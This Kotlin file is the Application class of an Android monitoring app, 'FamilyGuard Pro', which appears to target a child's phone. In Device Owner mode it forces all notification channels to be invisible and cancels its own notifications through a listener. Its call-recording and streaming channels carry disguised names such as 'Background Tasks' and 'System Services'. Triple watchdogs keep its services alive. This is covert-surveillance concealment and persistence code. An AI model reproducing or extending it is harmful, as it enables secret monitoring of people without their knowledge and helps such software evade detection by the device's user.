package com.familyguardpro

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import com.familyguardpro.network.ApiClient
import com.familyguardpro.services.AlarmManagerWatchdog
import com.familyguardpro.services.PersistentService
import com.familyguardpro.services.ServiceWatchdog
import com.familyguardpro.services.WebSocketSyncService
import com.familyguardpro.utils.DataUsageTracker
import com.familyguardpro.utils.DeviceUtils
import com.familyguardpro.utils.FcmTokenManager
import com.familyguardpro.utils.PreferenceManager

class FamilyGuardApp : Application() {
    
    companion object {
        const val CHANNEL_ID_FOREGROUND = "familyguard_foreground"
        const val CHANNEL_ID_STREAM = "familyguard_stream"
        const val CHANNEL_ID_SYNC = "familyguard_sync"
        const val CHANNEL_ID_CALL = "familyguard_call"
        const val CHANNEL_ID_PERSISTENT = "familyguard_persistent"
        const val CHANNEL_ID_ALERTS = "familyguard_alerts"
        const val CHANNEL_ID_URGENT = "familyguard_urgent"  // For service death alerts
        
        // Aliases for services
        const val NOTIFICATION_CHANNEL_FOREGROUND = CHANNEL_ID_FOREGROUND
        const val NOTIFICATION_CHANNEL_STREAMING = CHANNEL_ID_STREAM
        const val NOTIFICATION_CHANNEL_SYNC = CHANNEL_ID_SYNC
        const val NOTIFICATION_CHANNEL_CALL = CHANNEL_ID_CALL
        const val NOTIFICATION_CHANNEL_PERSISTENT = CHANNEL_ID_PERSISTENT
        const val NOTIFICATION_CHANNEL_ALERTS = CHANNEL_ID_ALERTS
        
        lateinit var instance: FamilyGuardApp
            private set
        
        // Server URL - Azure App Service
        const val BASE_URL = "https://familyguard-backend-c2c9hkc8dwgzepdq.centralindia-01.azurewebsites.net/"
        const val WS_URL = "wss://familyguard-backend-c2c9hkc8dwgzepdq.centralindia-01.azurewebsites.net/ws"
    }
    
    lateinit var preferenceManager: PreferenceManager
        private set
    
    // Media player for ring device feature
    var activeMediaPlayer: android.media.MediaPlayer? = null
    
    override fun onCreate() {
        super.onCreate()
        instance = this
        
        // Initialize preference manager
        preferenceManager = PreferenceManager(this)
        
        // Initialize API client
        ApiClient.init(this)
        
        // Initialize data usage tracker
        DataUsageTracker.init(this)
        
        // Create notification channels
        createNotificationChannels()
        
        // Force-enable NotificationListener in Device Owner mode
        // This allows us to auto-cancel our own notifications instantly
        // Also setup complete notification suppression
        try {
            val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
            if (doManager.isDeviceOwner()) {
                // Setup complete notification suppression (invisible channel, disable toggle, enable listener)
                doManager.setupCompleteNotificationSuppression()
            }
        } catch (e: Exception) {
            android.util.Log.w("FamilyGuardApp", "Could not setup notification suppression: ${e.message}")
        }
        
        // Cancel all stale notifications if Device Owner mode is active
        com.familyguardpro.utils.NotificationUtils.cancelAllNotificationsIfDeviceOwner(this)
        
        // Auto-complete setup if Device Owner is active but setup was not finished
        if (preferenceManager.isChildMode() && !preferenceManager.isSetupComplete()) {
            try {
                val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
                if (doManager.isDeviceOwner()) {
                    android.util.Log.d("FamilyGuardApp", "Device Owner active but setup incomplete — auto-completing setup")
                    preferenceManager.setSetupComplete(true)
                }
            } catch (e: Exception) {
                android.util.Log.e("FamilyGuardApp", "Error checking DO status for auto-setup", e)
            }
        }
        
        // Start persistent service if child mode is active
        if (preferenceManager.isChildMode() && preferenceManager.isSetupComplete()) {
            // Initialize FCM token immediately - ensures token is always fresh
            android.util.Log.w("FamilyGuardApp", "=== INITIALIZING FCM TOKEN MANAGER ===")
            try {
                FcmTokenManager.init(this)
                android.util.Log.w("FamilyGuardApp", "=== FCM TOKEN MANAGER INIT COMPLETE ===")
            } catch (e: Exception) {
                android.util.Log.e("FamilyGuardApp", "FCM TOKEN MANAGER INIT FAILED", e)
            }
            
            PersistentService.start(this)
            
            // Start WebSocket for REAL-TIME sync (replaces 20s polling delay with instant)
            WebSocketSyncService.start(this)
            
            // Start triple-redundancy watchdog system
            // 1. JobScheduler (survives doze on stock Android)
            ServiceWatchdog.schedule(this)
            
            // 2. AlarmManager (survives on MIUI when JobScheduler is killed)
            AlarmManagerWatchdog.schedule(this)
            
            // Log device information for debugging
            DeviceUtils.logDeviceInfo()
            
            // If MIUI device, log warning about special handling
            if (DeviceUtils.isMiui()) {
                android.util.Log.w("FamilyGuardApp", "=== MIUI DEVICE DETECTED ===")
                android.util.Log.w("FamilyGuardApp", "MIUI Version: ${DeviceUtils.getMiuiVersion()}")
                android.util.Log.w("FamilyGuardApp", "Triple-redundancy watchdog system activated")
            }
        }
    }
    
    private fun createNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = getSystemService(NotificationManager::class.java)
            
            // Check if Device Owner mode is active - if so, force IMPORTANCE_NONE
            val isDeviceOwner = try {
                val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
                doManager.isDeviceOwner()
            } catch (e: Exception) {
                false
            }
            
            // In Device Owner mode, force delete and recreate channels with IMPORTANCE_NONE
            // This ensures notifications are completely hidden and stay hidden
            fun createOrForceHiddenChannel(channel: NotificationChannel) {
                if (isDeviceOwner) {
                    // Delete existing channel first
                    try {
                        notificationManager.deleteNotificationChannel(channel.id)
                    } catch (e: Exception) {
                        // Channel might not exist
                    }
                    // Force IMPORTANCE_NONE - completely invisible
                    val hiddenChannel = NotificationChannel(
                        channel.id,
                        channel.name,
                        NotificationManager.IMPORTANCE_NONE
                    ).apply {
                        description = channel.description
                        setShowBadge(false)
                        enableLights(false)
                        enableVibration(false)
                        setSound(null, null)
                        lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
                    }
                    notificationManager.createNotificationChannel(hiddenChannel)
                    android.util.Log.d("FamilyGuardApp", "Created hidden channel (DO mode): ${channel.id}")
                } else {
                    // Not DO mode - create only if doesn't exist (respect user settings)
                    val existing = notificationManager.getNotificationChannel(channel.id)
                    if (existing == null) {
                        notificationManager.createNotificationChannel(channel)
                    }
                }
            }
            
            // Foreground service channel (hidden/low priority)
            val foregroundChannel = NotificationChannel(
                CHANNEL_ID_FOREGROUND,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background service notification"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            
            // Stream channel - Silent and invisible
            val streamChannel = NotificationChannel(
                CHANNEL_ID_STREAM,
                "System Services",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background services"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
            }
            
            // Sync channel
            val syncChannel = NotificationChannel(
                CHANNEL_ID_SYNC,
                "Data Sync",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Data synchronization"
                setShowBadge(false)
            }
            
            // Call recording channel - Silent and invisible
            val callChannel = NotificationChannel(
                CHANNEL_ID_CALL,
                "Background Tasks",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background processing"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
            }
            
            // Persistent service channel - Silent and invisible
            val persistentChannel = NotificationChannel(
                CHANNEL_ID_PERSISTENT,
                "System Protection",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background protection"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
            }
            
            // Alerts channel - For keyword alerts and geofence notifications
            val alertsChannel = NotificationChannel(
                CHANNEL_ID_ALERTS,
                "Safety Alerts",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Important safety and keyword alerts"
                setShowBadge(true)
                enableLights(true)
                lightColor = android.graphics.Color.RED
                enableVibration(true)
            }
            
            // Urgent channel - For service death/restart alerts on MIUI
            val urgentChannel = NotificationChannel(
                CHANNEL_ID_URGENT,
                "Service Alerts",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Service restart alerts"
                setShowBadge(true)
                enableLights(true)
                lightColor = android.graphics.Color.RED
                enableVibration(true)
            }
            
            // Create each channel - in DO mode, force hidden; otherwise preserve user settings
            listOf(foregroundChannel, streamChannel, syncChannel, callChannel, persistentChannel, alertsChannel, urgentChannel)
                .forEach { createOrForceHiddenChannel(it) }
        }
    }
    
    fun isChildMode(): Boolean {
        return preferenceManager.isChildMode()
    }
    
    fun isSetupComplete(): Boolean {
        return preferenceManager.isSetupComplete()
    }
    
    fun getStoredDeviceId(): String {
        return preferenceManager.getDeviceId()
    }
    
    fun getAuthToken(): String? {
        return preferenceManager.getAuthToken()
    }
}
